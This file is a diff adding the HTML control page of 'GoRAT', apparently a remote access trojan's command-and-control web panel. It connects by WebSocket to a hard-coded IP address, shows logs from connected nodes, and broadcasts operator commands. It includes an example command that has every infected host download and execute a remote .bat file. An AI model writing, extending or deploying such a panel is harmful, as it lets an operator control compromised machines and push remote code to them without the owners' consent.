@@ -1,0 +1,42 @@
+<title>GoRAT</title>
+<h1>GoRAT - WebServer</h1>
+<a><b>Broadcast command examples:</b></a><br>
+<ul>
+  RFS::DOFile[<&>]ip:all[<&>]uri:https://raw.githubusercontent.com/tinopai/gorat/master/examples/test.bat[<&>]fn:test.bat
+</ul>
+<textarea id="minput" autocomplete="off" placeholder="Broadcast message as NodeServer" style="resize: none;" cols="50" rows="2"></textarea>
+<br>
+<button type="submit" onclick="sendMessage(document.getElementById('minput').value)">Submit</button>
+<br>
+<br>
+<a id="console"><b>Logs:</b></a>
+<script>
+let socket = new WebSocket("ws://51.161.34.137:9898");
+
+socket.onopen = function(e) {
+  socket.send("WebServer::NewConnection");
+};
+
+socket.onmessage = function(event) {
+  document.getElementById("console").innerHTML += `<br>[MESSAGE] ${event.data}`;
+};
+
+socket.onclose = function(event) {
+  if (event.wasClean) {
+    alert(`[close] Connection closed cleanly, code=${event.code} reason=${event.reason}`);
+  } else {
+    // e.g. server process killed or network down
+    // event.code is usually 1006 in this case
+    alert('[close] Connection died');
+  }
+};
+
+socket.onerror = function(error) {
+  alert(`[error] ${error.message}`);
+};
+
+
+function sendMessage(message) {
+    socket.send(`WebServer::Message[<&>]Broadcast[<&>]${message}`);
+}
+</script>
